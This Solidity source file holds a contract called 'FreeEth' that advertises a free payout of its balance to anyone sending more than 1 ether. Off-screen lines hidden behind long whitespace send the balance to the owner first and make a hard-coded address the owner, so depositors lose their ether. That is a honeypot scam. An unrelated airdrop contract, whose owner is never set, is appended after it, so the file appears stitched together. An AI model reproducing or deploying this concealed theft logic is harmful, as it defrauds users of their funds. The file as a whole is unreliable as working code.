 

pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
interface ERCToken {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract AirdropContract {
    address public owner;
    ERCToken token;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function send(address _tokenAddr, address from, address[] dests, uint256[] values) public onlyOwner returns(uint256) {
        uint256 i = 0;
        token = ERCToken(_tokenAddr);
        while (i < dests.length) {
            token.transferFrom(from, dests[i], values[i]);
            i += 1;
        }
        return i;
    }
}
